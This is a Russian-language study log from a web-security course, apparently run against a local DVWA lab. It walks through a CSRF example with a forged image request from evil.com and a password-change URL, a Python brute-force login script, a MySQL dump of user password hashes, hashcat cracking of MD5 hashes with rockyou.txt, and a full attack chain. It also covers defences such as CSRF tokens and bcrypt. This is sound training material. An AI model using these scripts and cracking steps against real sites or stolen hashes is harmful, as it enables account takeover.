# День 13 — CSRF + Brute Force + Password Cracking

## 📌 Что прошли сегодня
- CSRF — Cross-Site Request Forgery атака
- Brute Force через Python requests
- MySQL — дамп хэшей паролей
- Hashcat — взлом MD5 хэшей

---

## 🎭 CSRF — Cross-Site Request Forgery

### Что это
Атака при которой **жертва сама отправляет вредоносный запрос** на сервер, не зная об этом. Браузер автоматически прикладывает куки сессии к любому запросу.

### OWASP категория
**A01 — Broken Access Control**

### Как работает
```
1. Жертва залогинена на bank.com (есть куки сессии)
2. Жертва открывает evil.com
3. evil.com содержит: <img src="http://bank.com/transfer?to=hacker&amount=1000">
4. Браузер автоматически загружает "картинку" → отправляет запрос на bank.com
5. bank.com видит куки жертвы → выполняет перевод!
```

### Разница CSRF vs XSS

| | XSS | CSRF |
|---|---|---|
| Что делает | Выполняет код в браузере | Отправляет запрос от имени жертвы |
| Нужна авторизация | Нет | Да |
| Цель | Украсть данные/куки | Выполнить действие |
| Защита | CSP, экранирование | CSRF токен, SameSite |

### Почему нужна авторизация жертвы
Сервер проверяет не факт логина а **куки сессии** (`PHPSESSID`). Браузер автоматически отправляет куки с каждым запросом к сайту. Жертва залогинена → куки есть → сервер думает что запрос легитимный!

### Практика на DVWA

```
# Легитимный запрос смены пароля:
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change

# CSRF атака — жертва переходит по ссылке и пароль меняется без её ведома:
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change

# Результат: Password Changed!
```

### Защита от CSRF
```
1. CSRF токен — уникальный случайный токен в каждой форме
   Сервер проверяет токен при каждом запросе
   Хакер не знает токен → запрос отклонён!

2. SameSite cookie — браузер не отправляет куки при запросах с других сайтов
   Set-Cookie: session=xxx; SameSite=Strict

3. Проверка Referer заголовка — откуда пришёл запрос
```

---

## 🔓 Brute Force — Python скрипт

### Получение PHPSESSID
```bash
curl -s -c /tmp/cookies.txt "http://127.0.0.1/dvwa/login.php" \
-d "username=admin&password=password&Login=Login" \
-b "security=low" > /dev/null && cat /tmp/cookies.txt
```

### Python брутфорс скрипт
```python
import requests

url = "http://127.0.0.1/dvwa/vulnerabilities/brute/"
cookies = {
    "PHPSESSID": "ВАШ_PHPSESSID",
    "security": "low"
}
passwords = ["123456","password","admin","test123","qwerty",
             "letmein","admin123","p@ssw0rd","password123"]

for pwd in passwords:
    params = {"username": "admin", "password": pwd, "Login": "Login"}
    r = requests.get(url, params=params, cookies=cookies)
    if "incorrect" not in r.text:
        print(f"[+] НАЙДЕН ПАРОЛЬ: {pwd}")
        break
    else:
        print(f"[-] Неверный: {pwd}")
```

```bash
# Запуск:
python3 /tmp/brute.py

# Результат:
[-] Неверный: 123456
[+] НАЙДЕН ПАРОЛЬ: password
```

### Python vs Hydra
| | Python | Hydra |
|---|---|---|
| Гибкость | Высокая — пишешь сам | Средняя — готовый инструмент |
| Скорость | Медленнее | Быстрее (многопоточность) |
| Настройка | Легко под любой сайт | Сложные параметры кавычек |
| Понимание | Полное | Черный ящик |

---

## 🗄️ MySQL — дамп хэшей

### Получить хэши паролей из БД
```bash
mysql -u dvwa -p'p@ssw0rd' -h 127.0.0.1 dvwa -e "SELECT user, password FROM users;"
```

### Результат DVWA
```
admin  → 5f4dcc3b5aa765d61d8327deb882cf99
gordonb→ e99a18c428cb38d5f26085367922e03
1337   → 8d3533dd75ae2c3966d7e0d4fcc69216b
pablo  → 0d107d09f5bbe40cade3de5c71e9e9b7
smithy → 5f4dcc3b5aa765d61d8327deb882cf99
```

---

## 🔨 Hashcat — взлом MD5 хэшей

### Что такое hashcat
Инструмент для взлома хэшей паролей через словарные атаки или перебор.

### Режимы (-m)
| Режим | Тип хэша |
|---|---|
| `-m 0` | MD5 |
| `-m 100` | SHA1 |
| `-m 1800` | SHA512crypt (Linux) |
| `-m 1000` | NTLM (Windows) |
| `-m 3200` | bcrypt |

### Команды
```bash
# Создать файл с хэшами
cat > /tmp/hashes.txt << 'EOF'
5f4dcc3b5aa765d61d8327deb882cf99
0d107d09f5bbe40cade3de5c71e9e9b7
EOF

# Взломать MD5 хэши
hashcat -m 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force

# Показать взломанные хэши
hashcat -m 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --show
```

### Результаты
```
5f4dcc3b5aa765d61d8327deb882cf99 : password   ← admin, smithy
0d107d09f5bbe40cade3de5c71e9e9b7 : letmein    ← pablo

Status: Cracked — 2/2 за 1 секунду!
```

### Почему так быстро?
```
1. "password" — популярный пароль, стоит в начале rockyou.txt
2. MD5 — быстрый алгоритм, тысячи хэшей в секунду
3. Hashcat проверил всего 1024 пароля из 14 миллионов!
```

### rockyou.txt — главный словарь
```
Расположение: /usr/share/wordlists/rockyou.txt
Размер: 14 344 392 паролей
История: утёк из взломанного сайта RockYou в 2009 году
Использование: брутфорс, hashcat, hydra, john
```

---

## 🔗 Полная цепочка атаки День 13

```
1. Получаем PHPSESSID → curl login
2. Брутфорс пароля → Python скрипт → "password"
3. Логинимся в MySQL → дамп хэшей всех пользователей
4. Hashcat → взламываем хэши → получаем пароли в открытом виде
5. CSRF → меняем пароль admin через URL
```

---

## ⚠️ Важные заметки

```bash
# Всегда обновляй PHPSESSID перед брутфорсом!
# Сессия истекает и запросы будут отклонены

# hashcat --show — показывает уже взломанные хэши из кэша
# не нужно взламывать заново

# Если rockyou.txt не разархивирован:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# MD5 небезопасен для хранения паролей!
# Современные сайты используют bcrypt/argon2 с солью
```

---

*День 13 завершён ✅ | Следующий: День 14*
